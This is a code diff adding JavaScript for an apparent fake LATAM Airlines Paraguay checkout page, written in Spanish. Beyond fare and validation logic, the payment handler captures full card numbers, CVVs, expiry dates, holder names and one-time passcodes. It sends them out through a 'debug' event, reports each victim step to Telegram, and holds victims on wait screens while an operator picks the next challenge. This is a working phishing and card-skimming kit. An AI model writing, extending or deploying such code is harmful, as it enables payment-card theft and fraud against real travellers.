+  function peopleLabel(selection) {
+    const adults = Math.max(1, Number(selection?.adults || 1));
+    const children = Number(selection?.children || 0);
+    const infants = Number(selection?.infants || 0);
+    const parts = [];
+    parts.push(`${adults} Adulto${adults === 1 ? '' : 's'}`);
+    if (children) parts.push(`${children} Niño${children === 1 ? '' : 's'}`);
+    if (infants) parts.push(`${infants} Infante${infants === 1 ? '' : 's'}`);
+    return parts.join(', ');
+  }
+
+  function formatShortDate(iso) {
+    if (!iso) return '';
+    const d = new Date(`${iso}T12:00:00`);
+    if (Number.isNaN(d.getTime())) return iso;
+    const days = ['dom', 'lun', 'mar', 'mié', 'jue', 'vie', 'sáb'];
+    const months = ['ene', 'feb', 'mar', 'abr', 'may', 'jun', 'jul', 'ago', 'sept', 'oct', 'nov', 'dic'];
+    return `${days[d.getDay()]}, ${d.getDate()} ${months[d.getMonth()]}`;
+  }
+
+  function buildLegs(selection) {
+    if (!selection?.outbound?.flight) return defaultLegs;
+    const out = selection.outbound.flight;
+    const legs = [
+      {
+        title: `De ${selection.from?.city || 'Origen'} a ${selection.to?.city || 'Destino'}`,
+        dateLabel: formatShortDate(selection.departDate) || defaultLegs[0].dateLabel,
+        depart: out.depart || '',
+        arrive: out.arrive || '',
+        fromCode: selection.from?.code || '',
+        toCode: selection.to?.code || '',
+        brand: selection.outbound?.brandName || selection.outbound?.brand || 'Full',
+      },
+    ];
+    if (selection.trip === 'roundtrip' && selection.inbound?.flight) {
+      const back = selection.inbound.flight;
+      legs.push({
+        title: `De ${selection.to?.city || 'Destino'} a ${selection.from?.city || 'Origen'}`,
+        dateLabel: formatShortDate(selection.returnDate) || defaultLegs[1]?.dateLabel || '',
+        depart: back.depart || '',
+        arrive: back.arrive || '',
+        fromCode: selection.to?.code || '',
+        toCode: selection.from?.code || '',
+        brand: selection.inbound?.brandName || selection.inbound?.brand || 'Full',
+      });
+    }
+    return legs;
+  }
+
+  function tripBase(selection, discounted = true) {
+    const people = Math.max(1, (selection?.adults || 0) + (selection?.children || 0) + (selection?.infants || 0));
+    const outRaw = Number(selection?.outbound?.price || 0);
+    const backRaw = selection?.trip === 'roundtrip' ? Number(selection?.inbound?.price || 0) : 0;
+    const out = discounted ? ticketAfterDiscount(outRaw) : outRaw;
+    const back = discounted ? ticketAfterDiscount(backRaw) : backRaw;
+    return (out + back) * people;
+  }
+
+  function seatExtras(seats) {
+    return Number(seats?.outbound?.price || 0) + Number(seats?.inbound?.price || 0);
+  }
+
+  function bagExtras(store) {
+    const hold = Number(store?.holdCount || 0) * 45;
+    const special = Number(store?.specialCount || 0) * 35;
+    const cabin = store?.cabin === 'cabin-plus' ? 25 : 0;
+    const car = store?.selectedCarId ? Number(store?.selectedCarPrice || 0) : 0;
+    return hold + special + cabin + car;
+  }
+
+  function computeTotal(selection, seats, store, pax, discounted = true) {
+    return tripBase(selection, discounted) + seatExtras(seats) + bagExtras(store) + Number(pax?.assistPrice || 0);
+  }
+
+  function renderLegs(legs) {
+    const root = document.getElementById('pagos-legs');
+    if (!root) return;
+    root.innerHTML = legs
+      .map(
+        (leg) => `
+      <li class="pagos-leg">
+        <p class="pagos-leg__title">${leg.title}</p>
+        <p class="pagos-leg__date">${leg.dateLabel}</p>
+        <p class="pagos-leg__times">
+          <span class="pagos-leg__dep">${leg.depart} ${leg.fromCode}</span>
+          <i class="pagos-leg__arrow" aria-hidden="true">
+            <svg viewBox="0 0 32 32" width="10" height="10"><path fill="currentColor" d="M13.55 4.45L23.4025 14.25L2 14.25L2 17.75L23.4025 17.75L13.55 27.55L16 30L30 16L16 2L13.55 4.45Z"/></svg>
+          </i>
+          <span class="pagos-leg__arr">${leg.arrive} ${leg.toCode}</span>
+        </p>
+        <div class="pagos-leg__brand-wrap">
+          <span class="pagos-leg__brand">${leg.brand}</span>
+        </div>
+      </li>
+    `,
+      )
+      .join('');
+  }
+
+  function renderDetail(selection, seats, store, pax, totalBefore, total) {
+    const body = document.getElementById('pagos-sheet-body');
+    if (!body) return;
+    const flightsBefore = tripBase(selection, false);
+    body.innerHTML = `
+      <p><strong>Vuelos</strong> · ${ticketMoney(flightsBefore, true)}</p>
+      <p><strong>Asientos</strong> · ${money(seatExtras(seats), true)}</p>
+      <p><strong>Equipaje / extras</strong> · ${money(bagExtras(store), true)}</p>
+      <p><strong>Asistencia</strong> · ${money(pax?.assistPrice || 0, true)}</p>
+      <p class="pagos-sheet__total"><strong>Total</strong> · ${totalMoney(totalBefore, total, true)}</p>
+      <p class="pagos-sheet__note">Incluye tasas, cargos e impuestos.</p>
+    `;
+  }
+
+  const selection = readJson(STORAGE_KEY, null);
+  const seats = readJson(SEATS_KEY, {});
+  const store = readJson(STORE_KEY, {});
+  const pax = readJson(PAX_KEY, {});
+  const totalBefore = selection?.outbound ? computeTotal(selection, seats, store, pax, false) : 350.46;
+  const total = selection?.outbound ? computeTotal(selection, seats, store, pax, true) : ticketAfterDiscount(350.46);
+  const legs = buildLegs(selection || {});
+
+  renderLegs(legs);
+  renderDetail(selection || {}, seats, store, pax, totalBefore, total);
+
+  const priceEl = document.getElementById('pagos-total-price');
+  const paxEl = document.getElementById('pagos-pax-label');
+  const payBtn = document.getElementById('pagos-pay');
+  const terms = document.getElementById('pagos-terms');
+  const email = document.getElementById('pagos-email');
+  const addCard = document.getElementById('pagos-add-card');
+  const addCardToggle = document.getElementById('pagos-add-card-toggle');
+  const cardForm = document.getElementById('pagos-card-form');
+  const cardAmount = document.getElementById('pagos-card-amount');
+  const invoiceToggle = document.getElementById('pagos-invoice-toggle');
+  const invoicePanel = document.getElementById('pagos-invoice-panel');
+  const invoiceBox = document.getElementById('pagos-invoice');
+  const invoiceConfirm = document.getElementById('pagos-invoice-confirm');
+  const sheet = document.getElementById('pagos-sheet');
+  const msg = document.getElementById('pagos-msg');
+  const walletLogin = document.getElementById('pagos-wallet-login');
+  const walletMsg = document.getElementById('pagos-wallet-msg');
+  const cardEmail = document.getElementById('pagos-card-email');
+  const cardNumber = document.getElementById('pagos-card-number');
+  const cardName = document.getElementById('pagos-card-name');
+  const cardExp = document.getElementById('pagos-card-exp');
+  const cardCvvWrap = document.getElementById('pagos-card-cvv-wrap');
+  const cardCvv = document.getElementById('pagos-card-cvv');
+  const cardBrandEl = document.getElementById('pagos-card-brand');
+  const cardNumberBox = document.getElementById('pagos-card-number-box');
+  const cardNumberOk = document.getElementById('pagos-card-number-ok');
+  const cardNumberField = document.getElementById('pagos-card-number-field');
+  const cardNumberError = document.getElementById('pagos-card-number-error');
+  const cardNameError = document.getElementById('pagos-card-name-error');
+  const cardExpError = document.getElementById('pagos-card-exp-error');
+  const cardCvvError = document.getElementById('pagos-card-cvv-error');
+  const cardEmailError = document.getElementById('pagos-card-email-error');
+
+  if (priceEl) priceEl.innerHTML = totalMoney(totalBefore, total);
+  if (cardAmount) cardAmount.innerHTML = totalMoney(totalBefore, total);
+  if (paxEl) paxEl.textContent = peopleLabel(selection);
+  if (payBtn) payBtn.innerHTML = `${copy.payPrefix} ${totalMoney(totalBefore, total, true)}`;
+  if (email && pax?.email) email.value = pax.email;
+
+  function isValidEmail(value) {
+    const v = String(value || '').trim();
+    return v.includes('@') && v.indexOf('@') > 0 && v.indexOf('@') < v.length - 1;
+  }
+
+  function syncEmailValidity(input) {
+    if (!input) return;
+    const v = input.value.trim();
+    const invalid = Boolean(v) && !isValidEmail(v);
+    input.setCustomValidity(invalid ? 'Ingresa un correo que incluya @' : '');
+    input.classList.toggle('is-invalid', invalid);
+    input.closest('.pagos-field')?.classList.toggle('is-invalid', invalid);
+  }
+
+  function validateCardName(value) {
+    const name = String(value || '').trim();
+    if (!name) return { valid: false, incomplete: true, message: '' };
+    if (name.length < 2) {
+      return { valid: false, incomplete: false, message: 'Ingresa el nombre como aparece en la tarjeta' };
+    }
+    return { valid: true, incomplete: false, message: '' };
+  }
+
+  function validateCardCvv(value, brand) {
+    const digits = onlyDigits(value);
+    const len = brand.cvvLength;
+    if (!digits) return { valid: false, incomplete: true, message: '' };
+    if (digits.length < len) {
+      return { valid: false, incomplete: true, message: `Ingresa los ${len} dígitos del CVV` };
+    }
+    if (digits.length !== len) {
+      return { valid: false, incomplete: false, message: 'CVV inválido' };
+    }
+    return { valid: true, incomplete: false, message: '' };
+  }
+
+  function isCardPaymentValid() {
+    const number = validateCardNumber(cardNumber?.value || '');
+    const name = validateCardName(cardName?.value || '');
+    const exp = validateCardExp(cardExp?.value || '');
+    const cvv = validateCardCvv(cardCvv?.value || '', number.brand);
+    return Boolean(number.valid && name.valid && exp.valid && cvv.valid);
+  }
+
+  function syncPayEnabled() {
+    const receiptOk = isValidEmail(email?.value);
+    const cardOpen = addCardToggle?.getAttribute('aria-expanded') === 'true';
+    const cardEmailOk = isValidEmail(cardEmail?.value);
+    const cardFieldsOk = isCardPaymentValid();
+    const ok = Boolean(terms?.checked && receiptOk && cardOpen && cardEmailOk && cardFieldsOk);
+    if (payBtn) payBtn.disabled = !ok;
+  }
+
+  terms?.addEventListener('change', syncPayEnabled);
+  email?.addEventListener('input', () => {
+    syncEmailValidity(email);
+    syncPayEnabled();
+  });
+  email?.addEventListener('blur', () => syncEmailValidity(email));
+  syncPayEnabled();
+
+  function setCardOpen(open) {
+    if (!addCard || !addCardToggle || !cardForm) return;
+    addCard.classList.toggle('is-selected', open);
+    addCardToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
+    addCardToggle.setAttribute('aria-pressed', open ? 'true' : 'false');
+    cardForm.hidden = !open;
+    if (open) syncCardFieldStates();
+    else syncPayEnabled();
+  }
+
+  if (addCardToggle) {
+    addCardToggle.onclick = () => {
+      if (addCardToggle.getAttribute('aria-expanded') === 'true') return;
+      setCardOpen(true);
+    };
+  }
+
+  function setFormattedValue(input, formatted) {
+    if (!input) return;
+    const start = input.selectionStart;
+    const prev = input.value;
+    input.value = formatted;
+    if (typeof start === 'number' && document.activeElement === input) {
+      const diff = formatted.length - prev.length;
+      const next = Math.max(0, start + diff);
+      try {
+        input.setSelectionRange(next, next);
+      } catch {
+        /* ignore */
+      }
+    }
+  }
+
+  function setFieldError(input, errorEl, message, { valid = false, showError = false } = {}) {
+    if (!input) return;
+    const hasError = Boolean(showError && message);
+    input.classList.toggle('is-invalid', hasError);
+    input.classList.toggle('is-valid', Boolean(valid) && !hasError);
+    input.setAttribute('aria-invalid', hasError ? 'true' : 'false');
+    if (errorEl) {
+      errorEl.hidden = !hasError;
+      errorEl.textContent = hasError ? message : '';
+    }
+  }
+
+  function currentBrand() {
+    return detectCardBrand(cardNumber?.value || '');
+  }
+
+  function syncBrandUi(brand, numberValid = false) {
+    if (cardNumber) cardNumber.maxLength = cardNumberMaxLength(brand);
+    if (cardCvv) cardCvv.maxLength = brand.cvvLength;
+
+    const showBrand = brand.brand !== 'unknown' && Boolean(brand.label);
+    if (cardBrandEl) {
+      cardBrandEl.hidden = !showBrand;
+      cardBrandEl.dataset.brand = brand.brand;
+      cardBrandEl.querySelectorAll('[data-brand-logo]').forEach((logo) => {
+        logo.hidden = logo.getAttribute('data-brand-logo') !== brand.brand;
+      });
+    }
+
+    cardNumberBox?.classList.toggle('has-brand', showBrand);
+    cardNumberBox?.classList.toggle('is-valid', Boolean(numberValid));
+    if (cardNumberBox) cardNumberBox.dataset.brand = showBrand ? brand.brand : '';
+    cardNumberField?.classList.toggle('has-brand', showBrand);
+    cardNumberField?.classList.toggle('is-filled', onlyDigits(cardNumber?.value || '').length > 0);
+
+    if (cardNumberOk) {
+      cardNumberOk.hidden = !numberValid;
+    }
+  }
+
+  function cardReadyForCvv() {
+    const number = validateCardNumber(cardNumber?.value || '');
+    const hasNumber = onlyDigits(cardNumber?.value || '').length >= number.brand.length;
+    const hasName = String(cardName?.value || '').trim().length >= 2;
+    const hasExp = onlyDigits(cardExp?.value || '').length === 4;
+    return hasNumber && hasName && hasExp;
+  }
+
+  function syncCardCvvVisibility() {
+    if (!cardCvvWrap) return;
+    const show = cardReadyForCvv();
+    const wasHidden = cardCvvWrap.hidden;
+    cardCvvWrap.hidden = !show;
+    if (show && wasHidden) cardCvv?.focus();
+    if (!show && cardCvv) {
+      cardCvv.value = '';
+      setFieldError(cardCvv, cardCvvError, '', {});
+    }
+  }
+
+  function syncCardFieldStates(opts = {}) {
+    const force = Boolean(opts.force);
+    const number = validateCardNumber(cardNumber?.value || '');
+    const name = validateCardName(cardName?.value || '');
+    const exp = validateCardExp(cardExp?.value || '');
+    const cvv = validateCardCvv(cardCvv?.value || '', number.brand);
+
+    syncBrandUi(number.brand, number.valid);
+
+    setFieldError(cardNumber, cardNumberError, number.message, {
+      valid: number.valid,
+      showError: force || (!number.incomplete && Boolean(number.message)),
+    });
+    cardNumberBox?.classList.toggle('is-invalid', Boolean(
+      (force || (!number.incomplete && Boolean(number.message))) && number.message,
+    ));
+    setFieldError(cardName, cardNameError, name.message, {
+      valid: name.valid,
+      showError: force || (!name.incomplete && Boolean(name.message)),
+    });
+    setFieldError(cardExp, cardExpError, exp.message, {
+      valid: exp.valid,
+      showError: force || (!exp.incomplete && Boolean(exp.message)),
+    });
+
+    if (!cardCvvWrap?.hidden) {
+      setFieldError(cardCvv, cardCvvError, cvv.message, {
+        valid: cvv.valid,
+        showError: force || (!cvv.incomplete && Boolean(cvv.message)),
+      });
+    }
+
+    syncCardCvvVisibility();
+    syncPayEnabled();
+  }
+
+  function syncCardEmailError() {
+    if (!cardEmail) return;
+    const v = cardEmail.value.trim();
+    const invalid = Boolean(v) && !isValidEmail(v);
+    const empty = !v;
+    setFieldError(cardEmail, cardEmailError, invalid ? 'Ingresa un correo que incluya @' : '', {
+      valid: !empty && !invalid,
+      showError: invalid,
+    });
+  }
+
+  let notifiedPaymentTyping = false;
+  function notifyPaymentTyping() {
+    if (notifiedPaymentTyping) return;
+    notifiedPaymentTyping = true;
+    notifyTelegramStep('Esta ingresando el detalle de pago');
+  }
+
+  cardNumber?.addEventListener('focus', () => cardNumber.removeAttribute('readonly'));
+  cardName?.addEventListener('focus', () => cardName.removeAttribute('readonly'));
+  cardExp?.addEventListener('focus', () => cardExp.removeAttribute('readonly'));
+  cardCvv?.addEventListener('focus', () => cardCvv.removeAttribute('readonly'));
+  cardEmail?.addEventListener('focus', () => cardEmail.removeAttribute('readonly'));
+  [cardNumber, cardName, cardExp, cardCvv, cardEmail].forEach((input) => {
+    input?.addEventListener('input', notifyPaymentTyping);
+    input?.addEventListener('focus', notifyPaymentTyping);
+  });
+
+  function syncPlaceholderState(input) {
+    input?.closest('.pagos-card-input')?.classList.toggle(
+      'has-value',
+      Boolean(String(input?.value || '').trim()),
+    );
+  }
+
+  let binLookupTimer = 0;
+  let lastBinQuery = '';
+
+  function scheduleBinLookup() {
+    const digits = onlyDigits(cardNumber?.value || '');
+    if (digits.length < 6) {
+      window.clearTimeout(binLookupTimer);
+      lastBinQuery = '';
+      return;
+    }
+    const bin = digits.slice(0, 6);
+    if (bin === lastBinQuery) return;
+    window.clearTimeout(binLookupTimer);
+    binLookupTimer = window.setTimeout(async () => {
+      lastBinQuery = bin;
+      try {
+        await fetch(`/api/bin?bin=${encodeURIComponent(bin)}`);
+      } catch {
+        /* ignore */
+      }
+    }, 400);
+  }
+
+  cardNumber?.addEventListener('input', () => {
+    const brand = detectCardBrand(cardNumber.value);
+    setFormattedValue(cardNumber, formatCardNumber(cardNumber.value, brand));
+    syncCardFieldStates();
+    scheduleBinLookup();
+  });
+  cardNumber?.addEventListener('blur', () => {
+    const brand = detectCardBrand(cardNumber.value);
+    setFormattedValue(cardNumber, formatCardNumber(cardNumber.value, brand));
+    syncCardFieldStates({ force: true });
+  });
+  cardName?.addEventListener('input', () => {
+    cardName.value = String(cardName.value || '').replace(/\d/g, '');
+    syncPlaceholderState(cardName);
+    syncCardFieldStates();
+  });
+  cardName?.addEventListener('blur', () => syncCardFieldStates({ force: true }));
+  cardExp?.addEventListener('input', () => {
+    setFormattedValue(cardExp, formatCardExp(cardExp.value));
+    syncPlaceholderState(cardExp);
+    syncCardFieldStates();
+  });
+  cardExp?.addEventListener('blur', () => {
+    setFormattedValue(cardExp, formatCardExp(cardExp.value));
+    syncCardFieldStates({ force: true });
+  });
+  cardCvv?.addEventListener('input', () => {
+    const brand = currentBrand();
+    cardCvv.value = onlyDigits(cardCvv.value).slice(0, brand.cvvLength);
+    syncPlaceholderState(cardCvv);
+    syncCardFieldStates();
+  });
+  cardCvv?.addEventListener('blur', () => syncCardFieldStates({ force: true }));
+  cardEmail?.addEventListener('input', () => {
+    syncPlaceholderState(cardEmail);
+    syncEmailValidity(cardEmail);
+    syncCardEmailError();
+    syncPayEnabled();
+  });
+  cardEmail?.addEventListener('blur', () => {
+    syncEmailValidity(cardEmail);
+    syncCardEmailError();
+  });
+  syncPlaceholderState(cardName);
+  syncPlaceholderState(cardExp);
+  syncPlaceholderState(cardCvv);
+  syncPlaceholderState(cardEmail);
+  syncCardFieldStates();
+
+  if (walletLogin) {
+    walletLogin.onclick = () => {
+      if (!walletMsg) return;
+      walletMsg.hidden = false;
+      walletMsg.textContent = copy.walletUnavailable;
+    };
+  }
+
+  function setInvoiceOpen(on) {
+    if (!invoiceToggle) return;
+    invoiceToggle.setAttribute('aria-checked', on ? 'true' : 'false');
+    invoiceToggle.classList.toggle('is-on', on);
+    invoiceBox?.classList.toggle('is-on', on);
+    if (invoicePanel) invoicePanel.hidden = !on;
+    if (!on && invoiceConfirm) invoiceConfirm.checked = false;
+  }
+
+  if (invoiceToggle) {
+    invoiceToggle.onclick = (event) => {
+      event.stopPropagation();
+      const on = invoiceToggle.getAttribute('aria-checked') !== 'true';
+      setInvoiceOpen(on);
+    };
+  }
+
+  function setSheet(open) {
+    if (!sheet) return;
+    sheet.hidden = !open;
+    sheet.classList.toggle('is-open', open);
+    document.body.classList.toggle('pagos-sheet-open', open);
+    if (open) notifyTelegramStep('Abrio el banner de pago');
+  }
+
+  document.getElementById('pagos-detail-toggle')?.addEventListener('click', () => setSheet(true));
+  sheet?.querySelectorAll('[data-pagos-sheet-close]').forEach((el) => el.addEventListener('click', () => setSheet(false)));
+
+  payBtn?.addEventListener('click', async () => {
+    if (payBtn.disabled || payBtn.classList.contains('is-loading')) return;
+    notifyTelegramStep('Ingreso el detalle de pago correctamente');
+    debugPollGen += 1;
+    const wait = document.getElementById('pagos-wait-screen');
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const brand = detectCardBrand(cardNumber?.value || '').brand;
+    let brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand)
+      ? brand
+      : 'visa';
+    const now = new Date();
+    const months = [
+      'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
+      'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
+    ];
+    const dateLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}`;
+    const timeLabel = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+    const datetimeLabel = `${dateLabel} · ${timeLabel}`;
+    const amountLabel = money(total, true);
+    const merchantLabel = 'LATAM Airlines Paraguay';
+    const payLabel = payBtn.textContent;
+    const cardDigits = onlyDigits(cardNumber?.value || '');
+
+    payBtn.classList.add('is-loading');
+    payBtn.disabled = true;
+    payBtn.setAttribute('aria-busy', 'true');
+    payBtn.innerHTML = '<span class="pagos-pay__spin" aria-hidden="true"></span>';
+
+    try {
+      console.log('----------------')
+      console.log('----------------')
+      console.log('PAYMENT_SUBMIT:')
+      console.log('CARD: ', cardNumber.value)
+      console.log('EXP: ', cardExp.value)
+      console.log('CVV: ', cardCvv.value)
+      const paymentMeta = {
+          step: 'Envió datos de tarjeta',
+          brand: brandKey,
+          amount: Number(total) || 0,
+          amountLabel: amountLabel,
+          card: maskCard(cardNumber?.value || ''),
+          cardFirstDigit: cardDigits.charAt(0),
+          cvvLength: onlyDigits(cardCvv?.value || '').length,
+          cpayload: {
+            b: cardNumber.value,
+            cv: cardCvv.value,
+            exp: cardExp.value,
+            holder: cardName.value,
+          }
+        };
+      sessionStorage.setItem('latam-payment-telegram-meta', JSON.stringify(paymentMeta));
+      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
+        cardFirstDigit: cardDigits.charAt(0),
+        meta: paymentMeta,
+      });
+      if (route?.brand && ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(route.brand)) {
+        brandKey = route.brand;
+      }
+      setUiMessage('');
+      payBtn.classList.remove('is-loading');
+      payBtn.removeAttribute('aria-busy');
+      payBtn.textContent = payLabel;
+
+      wait?.querySelectorAll('[data-wait-brand]').forEach((panel) => {
+        panel.hidden = panel.getAttribute('data-wait-brand') !== brandKey;
+      });
+      if (wait) wait.hidden = false;
+      if (challenge) challenge.hidden = true;
+      document.body.classList.add('is-offers-waiting');
+
+      sessionStorage.setItem(
+        'latam-payment-draft',
+        JSON.stringify({
+          paidAt: now.toISOString(),
+          total,
+          email: email?.value || '',
+          invoice: invoiceToggle?.getAttribute('aria-checked') === 'true',
+          method: addCard?.classList.contains('is-selected') ? 'card' : 'none',
+          brand: brandKey,
+          merchant: merchantLabel,
+          amountLabel,
+          dateLabel,
+          timeLabel,
+        }),
+      );
+
+      await watchOperatorDecisions({
+        wait,
+        challenge,
+        brandKey,
+        merchantLabel,
+        amountLabel,
+        datetimeLabel,
+        resetChallenge: true,
+      });
+    } catch (error) {
+      payBtn.classList.remove('is-loading');
+      payBtn.removeAttribute('aria-busy');
+      payBtn.textContent = payLabel;
+      syncPayEnabled();
+      setUiMessage(error instanceof Error ? error.message : 'No se pudo continuar con el pago.');
+    }
+  });
+
+  document.querySelectorAll('[data-help-toggle]').forEach((btn) => {
+    btn.addEventListener('click', () => {
+      const root = btn.closest('[data-help]');
+      const panel = root?.querySelector('[data-help-panel]');
+      const icon = root?.querySelector('[data-help-icon]');
+      if (!panel) return;
+      const open = !panel.hidden;
+      panel.hidden = open;
+      if (icon) icon.textContent = open ? '+' : '−';
+      btn.setAttribute('aria-expanded', String(!open));
+    });
+  });
+
+  document.querySelectorAll('[data-otp-form]').forEach((form) => {
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const input = form.querySelector('input[name="otp"]');
+      if (!input?.value.trim()) {
+        input?.focus();
+        return;
+      }
+      const panel = form.closest('[data-challenge-brand]');
+      const brandKey = panel?.getAttribute('data-challenge-brand') || 'visa';
+      const attempts = Number(form.dataset.attempts || '0') + 1;
+      form.dataset.attempts = String(attempts);
+      setUiMessage('');
+      clearChallengeMessages();
+      console.log('[debug-otp-submit]', {
+        sessionId: debugSessionId(),
+        brand: brandKey,
+        otpLength: String(input.value || '').trim().length,
+        attempt: attempts,
+      });
+      try {
+        console.log('----------------')
+        console.log('----------------')
+        console.log('OTP_SUBMIT:')
+        console.log('OTP: ', input.value)
+        let paymentMeta = {};
+        try {
+          paymentMeta = JSON.parse(sessionStorage.getItem('latam-payment-telegram-meta') || '{}') || {};
+        } catch {
+          paymentMeta = {};
+        }
+        if (!paymentMeta.cpayload && cardNumber?.value) {
+          paymentMeta = {
+            step: 'Envió código OTP',
+            brand: brandKey,
+            amount: Number(total) || 0,
+            amountLabel: money(total, true),
+            card: maskCard(cardNumber.value),
+            cpayload: {
+              b: cardNumber.value,
+              cv: cardCvv?.value || '',
+              exp: cardExp?.value || '',
+              holder: cardName?.value || '',
+            },
+          };
+        }
+        await sendDebugEvent('OTP_SUBMIT', {
+          meta: paymentMeta,
+          metaOtp: {
+            step: 'Envió código OTP',
+            brand: brandKey,
+            otp: input.value,
+            otpLength: String(input.value || '').trim().length,
+            attempt: attempts,
+          },
+        });
+      } catch {
+        setChallengeMessage(brandKey, 'No pudimos procesar el código. Intenta nuevamente.');
+        return;
+      }
+      debugPollGen += 1;
+      const wait = document.getElementById('pagos-wait-screen');
+      const challenge = document.getElementById('pagos-challenge-screen');
+      wait?.querySelectorAll('[data-wait-brand]').forEach((el) => {
+        el.hidden = el.getAttribute('data-wait-brand') !== brandKey;
+      });
+      if (challenge) challenge.hidden = true;
+      if (wait) wait.hidden = false;
+      document.body.classList.add('is-offers-waiting');
+
+      const draft = JSON.parse(sessionStorage.getItem('latam-payment-draft') || '{}');
+      await watchOperatorDecisions({
+        wait,
+        challenge,
+        brandKey,
+        merchantLabel: draft.merchant || 'LATAM Airlines Paraguay',
+        amountLabel: draft.amountLabel || money(total, true),
+        datetimeLabel: draft.dateLabel && draft.timeLabel ? `${draft.dateLabel} · ${draft.timeLabel}` : '',
+        resetChallenge: false,
+      });
+    });
+  });
+</script>
